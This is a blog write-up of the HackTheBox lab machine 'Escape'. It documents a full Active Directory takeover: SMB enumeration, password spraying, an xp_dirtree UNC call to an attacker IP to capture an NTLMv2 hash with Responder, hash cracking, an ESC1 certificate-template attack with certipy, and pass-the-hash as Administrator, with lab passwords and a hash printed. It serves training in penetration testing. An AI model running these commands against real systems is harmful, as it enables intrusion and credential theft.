---
title: "Escape HackTheBox" 
date: 2025-07-02 06:00:00 0000+
tags: [WriteUp, Escape, HTB, Enumeration, Active Directory, ADCS, MSSQL, Responder, Hash Cracking, Logs, mistyped passwords, ESC1, PTH, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Escape_HTB/preview_escape.png
---
# Escape HTB Writeup

Escape is an medium level HTB machine which focusses on enumerating MSSQL server, hash capturing and cracking, discovering credentials in log files, mistyped passwords and ADCS for privilege escalation.

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services.

```bash
rustmap.py -ip 10.129.228.253
```

![image.png](/assets/images/Escape_HTB/image.png)

![image.png](/assets/images/Escape_HTB/image%201.png)

![image.png](/assets/images/Escape_HTB/image%202.png)

![image.png](/assets/images/Escape_HTB/image%203.png)

### SMB Enumeration

We used netexec for SMB enumeration.

```bash
nxc smb sequel.htb -u '.' -p ''
```

We see that guest sign-in is enabled on the box.

Also the Domain Controller is DC and the domain is sequel.htb.

Added that entry in /etc/hosts file.

![image.png](/assets/images/Escape_HTB/image%204.png)

Since guest sign-in is enabled, we enumerated shares on the box

```bash
nxc smb sequel.htb -u '.' -p '' --shares
```

![image.png](/assets/images/Escape_HTB/image%205.png)

There’s only one file present inside the Public share “SQL Server Procedures.pdf”, downloaded that file to our local system.

Now we can also enumerate users on the box with Rid bruteforcing 

```bash
nxc smb sequel.htb -u '.' -p '' --rid-brute
```

![image.png](/assets/images/Escape_HTB/image%206.png)

Created a usernames.txt file and stored the users in it.

![image.png](/assets/images/Escape_HTB/image%207.png)

These are the users on the box sequel.htb

## Shell as SQL_SVC

Now opening the “SQL SERVER PROCEDURES.PDF” file, we go through it and found some credentials of a public user.

![image.png](/assets/images/Escape_HTB/image%208.png)

Added the PublicUser to the usernames.txt and did a password spray on the users.

```bash
nxc mssql sequel.htb -u usernames.txt -p 'GuestUserCantWrite1' --local-auth
```

Used —local-auth to authenticate locally.

![image.png](/assets/images/Escape_HTB/image%209.png)

We see that we can connect to the mssql server as PublicUser.

We used [mssqlclient.py](http://mssqlclient.py) from the impacket collection.

```bash
impacket-mssqlclient -p 1433 sequel.htb/'PublicUser':'GuestUserCantWrite1'@sequel.htb
```

![image.png](/assets/images/Escape_HTB/image%2010.png)

I tried enumerating inside the server and did not find anything useful tried to enable xp_cmdshell and xp_cmdshell to execute commands but we didn't have privileges to do so.

But we can use **xp_dirtree** used to list directories, we can specify UNC to it and obtain the hash of the user making the connection.

First we need to spin-up Responder to be able to catch the hash.

```bash
Responder -I tun0 -v # specify your interface
```

![image.png](/assets/images/Escape_HTB/image%2011.png)

After spinning up responder we can use xp_dirtree to send us a connection back.

```bash
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.46\noshare
```

This will trigger a connection back to our attack machine.

And just like that we have a NTLMv2 Hash.

![image.png](/assets/images/Escape_HTB/image%2012.png)

Storing this hash in a file.

Now we can crack this hash using hashcat.

This is NetNTLMv2 hash with hashcat mode equals 5600

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Escape_HTB/image%2013.png)

Hashcat was able to successfully crack the hash and now we have a new pair of credentials, saving them into the creds.txt file.

Now again did the password spray on the usernames.txt with our new password.

```bash
nxc winrm sequel.htb -u usernames.txt -p 'REGGIE1234ronnie' --continue-on-success
```

![image.png](/assets/images/Escape_HTB/image%2014.png)

We can see pwned, so logging in using evil-winrm.

After logging in I enumerated thoroughly and found a SQLServer directory in C:\

![image.png](/assets/images/Escape_HTB/image%2015.png)

There I discovered a ERRORLOG.BAK file.

## Shell as Ryan.Cooper

![image.png](/assets/images/Escape_HTB/image%2016.png)

We can clearly see that the user may have mistyped their password “NuclearMosquito3”, testing this password with password spraying on our usernames list.

![image.png](/assets/images/Escape_HTB/image%2017.png)

This reveals that we have valid password for user Ryan.Cooper.

Now logging in with Ryan with evil-winrm.

![image.png](/assets/images/Escape_HTB/image%2018.png)

Grabbing user.txt and submitting it.

## Privilege Escalation

Now for the privesc part, I tried uploading winpeas to the target system and didn’t find anything to be useful.

Relooking the output of the Nmap, we saw that the commonName=sequel-DC-CA.

The CA in the common name means Certificate Authority.

Now using Certipy to find the vulnerable templates on the server.

```bash
certipy find -u ryan.cooper -p "NuclearMosquito3" -dc-ip 10.129.228.253 -vulnerable -text -enabled
```

![image.png](/assets/images/Escape_HTB/image%2019.png)

The output got saved in txt file.

OUTPUT:

```text
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

We can see from the output that it is vulnerable to ESC1.

<blockquote style="color: red; font-weight: bold;">
ESC1(Enterprise Subordinate CA-1) - Means that any user can request a valid authentication certificate on behalf of any other user.
</blockquote>

### ESC1

Now performing a ESC1 attack.

```bash
certipy req -u "ryan.cooper" -p "NuclearMosquito3" -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn administrator@sequel.htb -ns 10.129.228.253 -target-ip 10.129.228.253
```

![image.png](/assets/images/Escape_HTB/image%2020.png)

Successfully grabbed the pfx for the administrator !!

Now authenticating with the pfx file.

```bash
certipy auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.228.253
```

![image.png](/assets/images/Escape_HTB/image%2021.png)

Successfully retrieved the NT hash for the Administrator.

### PassTheHash (PTH)

Now we do the pass the hash attack with user as Administrator.

```bash
evil-winrm -i sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
```

![image.png](/assets/images/Escape_HTB/image%2022.png)

Thanks for reading!!

![image.png](/assets/images/Escape_HTB/image%2023.png)
